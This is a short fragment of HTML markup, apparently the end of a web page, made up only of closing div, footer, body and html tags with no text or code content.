</div>
</div>
</div>
</div>
</footer>
</body>
</html>